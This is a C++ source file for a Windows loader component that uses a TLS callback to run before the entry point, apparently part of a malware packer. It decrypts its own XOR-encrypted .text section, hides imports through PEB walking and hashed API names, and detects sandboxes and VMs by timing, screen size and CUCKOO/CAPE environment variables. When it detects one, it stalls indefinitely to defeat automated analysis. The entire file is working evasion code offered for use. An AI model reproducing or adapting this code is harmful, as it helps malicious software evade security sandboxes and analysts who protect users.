// runtime_tls.cpp — TLS Callback + .text self-decryption
// Runs BEFORE the entry point — invisible to most sandbox static analysis.
//
// What it does:
//   1. Sleep briefly → defeats sandboxes that time-out at ~5 seconds
//   2. Environment checks → detect VM/sandbox and stall
//   3. Decrypt .text → XOR key patched by pe_header_spoofer.py at build time

#define NULL 0
#include "peb_walk.h"

// Place ALL TLS callback code in .tls_dec so the spoofer's .text encrypt
// does not clobber the decryptor itself.
#pragma section(".tls_dec", execute, read)
#pragma code_seg(".tls_dec")

typedef unsigned long       DWORD;
typedef unsigned long long  SIZE_T;
typedef void*               PVOID;
typedef PVOID               HANDLE;
typedef int                 BOOL;
typedef unsigned char       BYTE;

typedef void    (__stdcall *Fn_Sleep)          (DWORD);
typedef DWORD   (__stdcall *Fn_GetTickCount)   (void);
typedef BOOL    (__stdcall *Fn_VirtualProtect) (PVOID, SIZE_T, DWORD, DWORD*);
typedef DWORD   (__stdcall *Fn_GetSystemMetrics)(int);
typedef DWORD   (__stdcall *Fn_GetEnvironmentVariableA)(const char*, char*, DWORD);

#define PAGE_EXECUTE_READ  0x20
#define PAGE_READWRITE     0x04

// ── XOR key patched by pe_header_spoofer.py ──────────────────────────────────
// The spoofer XOR-encrypts .text with a random byte, then writes that byte here.
// At TLS time we XOR .text back.
// If the spoofer has not run (debug builds), key == 0 → XOR is a no-op.
#pragma section(".jdata", read, write)
__declspec(allocate(".jdata")) volatile BYTE jocky_text_key = 0x00;

// ── Helpers ──────────────────────────────────────────────────────────────────

static PVOID k32b() {
    static PVOID b = (PVOID)0;
    if (!b) b = peb_get_module(WHASH_K32);
    return b;
}

static void jky_sleep(DWORD ms) {
    static Fn_Sleep fn = (Fn_Sleep)0;
    if (!fn) fn = (Fn_Sleep)peb_get_export(k32b(), ct_hash("Sleep"));
    if (fn) fn(ms);
}

static DWORD jky_tick() {
    static Fn_GetTickCount fn = (Fn_GetTickCount)0;
    if (!fn) fn = (Fn_GetTickCount)peb_get_export(k32b(), ct_hash("GetTickCount"));
    return fn ? fn() : 0;
}

static BOOL jky_protect(PVOID addr, SIZE_T size, DWORD prot, DWORD* old) {
    static Fn_VirtualProtect fn = (Fn_VirtualProtect)0;
    if (!fn) fn = (Fn_VirtualProtect)peb_get_export(k32b(), ct_hash("VirtualProtect"));
    return fn ? fn(addr, size, prot, old) : 0;
}

// ── Sandbox / VM detection ────────────────────────────────────────────────────

static BOOL is_sandbox() {
    // Check 1: tick delta — sandboxes often accelerate Sleep()
    DWORD t0 = jky_tick();
    jky_sleep(500);
    DWORD t1 = jky_tick();
    DWORD delta = t1 - t0;
    if (delta < 400) return 1;  // sleep was accelerated

    // Check 2: screen resolution — headless VMs often report 0x0 or very small
    static Fn_GetSystemMetrics fn_sm = (Fn_GetSystemMetrics)0;
    if (!fn_sm) {
        PVOID u32 = peb_get_module(ct_whash(L"user32.dll"));
        if (!u32) {
            // Load user32 via PEB-resolved LoadLibraryA
            typedef PVOID (__stdcall *Fn_LoadLib)(const char*);
            Fn_LoadLib fn_ll = (Fn_LoadLib)peb_get_export(k32b(), ct_hash("LoadLibraryA"));
            if (fn_ll) u32 = fn_ll("user32.dll");
        }
        if (u32) fn_sm = (Fn_GetSystemMetrics)peb_get_export(u32, ct_hash("GetSystemMetrics"));
    }
    if (fn_sm) {
        int w = (int)fn_sm(0);  // SM_CXSCREEN
        int h = (int)fn_sm(1);  // SM_CYSCREEN
        if (w < 800 || h < 600) return 1;
    }

    // Check 3: environment variable SANDBOX / CUCKOO / CAPE — set by some sandboxes
    static Fn_GetEnvironmentVariableA fn_env = (Fn_GetEnvironmentVariableA)0;
    if (!fn_env) fn_env = (Fn_GetEnvironmentVariableA)peb_get_export(k32b(), ct_hash("GetEnvironmentVariableA"));
    if (fn_env) {
        char buf[4] = {0};
        if (fn_env("CUCKOO", buf, 4) > 0) return 1;
        if (fn_env("CAPE",   buf, 4) > 0) return 1;
    }

    return 0;
}

// ── .text decryption ──────────────────────────────────────────────────────────

static void decrypt_text_section() {
    BYTE key = jocky_text_key;
    if (key == 0) return;  // not encrypted (debug build or spoofer didn't run)

    // Find own base via PEB
    PVOID peb;
#if defined(_M_X64) || defined(__x86_64__)
    __asm__ volatile ("mov %%gs:0x60, %0" : "=r"(peb));
#else
    __asm__ volatile ("mov %%fs:0x30, %0" : "=r"(peb));
#endif
    PVOID image_base = *(PVOID*)((BYTE*)peb + 0x10);
    BYTE* base = (BYTE*)image_base;

    // Parse PE to find .text section
    DWORD e_lfanew = *(DWORD*)(base + 0x3C);
    DWORD opt_off  = e_lfanew + 4 + 20;
    DWORD opt_size = *(unsigned short*)(base + e_lfanew + 4 + 16);
    DWORD num_secs = *(unsigned short*)(base + e_lfanew + 4 + 2);
    BYTE* sec_tbl  = base + opt_off + opt_size;

    for (DWORD i = 0; i < num_secs; i++) {
        BYTE* sh    = sec_tbl + i * 40;
        // Section name: first 8 bytes
        if (sh[0]=='.' && sh[1]=='t' && sh[2]=='e' && sh[3]=='x' && sh[4]=='t') {
            DWORD vsize = *(DWORD*)(sh + 8);
            DWORD rva   = *(DWORD*)(sh + 12);
            BYTE* text  = base + rva;

            DWORD old_prot = 0;
            jky_protect(text, vsize, PAGE_READWRITE, &old_prot);
            for (DWORD j = 0; j < vsize; j++) text[j] ^= key;
            jky_protect(text, vsize, PAGE_EXECUTE_READ, &old_prot);

            // Zero the key so it can't be trivially extracted post-decryption
            jocky_text_key = 0;
            break;
        }
    }
}

// ── TLS Callback ──────────────────────────────────────────────────────────────

static void __stdcall jocky_tls_callback(PVOID, DWORD reason, PVOID) {
    if (reason != 1) return;  // DLL_PROCESS_ATTACH only

    // 1. Decrypt .text before any user code runs
    decrypt_text_section();

    // 2. Stall if we detect a sandbox
    if (is_sandbox()) {
        // Infinite sleep — sandbox will time out and report "no behavior"
        jky_sleep(0xFFFFFFFF);
    }
}

// ── TLS directory wiring ──────────────────────────────────────────────────────
// Standard MSVC-compatible TLS directory wiring for LLD.
// The linker looks for _tls_used in .rdata and _tls_callback_array in .CRT$XLB.

#pragma section(".tls",    read, write)
#pragma section(".tls$ZZZ",read, write)
#pragma section(".CRT$XLB",read)
#pragma section(".rdata$T",read)

extern "C" {
    __declspec(allocate(".tls"))
    BYTE _tls_start = 0;

    __declspec(allocate(".tls$ZZZ"))
    BYTE _tls_end = 0;

    static volatile unsigned long _tls_index = 0;

    // Null-terminated callback array
    __declspec(allocate(".CRT$XLB"))
    void (__stdcall * _tls_callback_array[])(PVOID, DWORD, PVOID) = {
        jocky_tls_callback,
        (void (__stdcall*)(PVOID,DWORD,PVOID))0
    };

    struct _IMAGE_TLS_DIRECTORY64 {
        unsigned long long StartAddressOfRawData;
        unsigned long long EndAddressOfRawData;
        unsigned long long AddressOfIndex;
        unsigned long long AddressOfCallBacks;
        unsigned long      SizeOfZeroFill;
        unsigned long      Characteristics;
    };

    // Must NOT be const — C++ const at namespace scope has internal linkage,
    // making _tls_used invisible to the linker. extern + non-const = external linkage.
    #pragma comment(linker, "/include:_tls_used")
    __declspec(allocate(".rdata$T"))
    _IMAGE_TLS_DIRECTORY64 _tls_used = {
        (unsigned long long)&_tls_start,
        (unsigned long long)&_tls_end,
        (unsigned long long)&_tls_index,
        (unsigned long long)&_tls_callback_array[0],
        0,
        0
    };
}
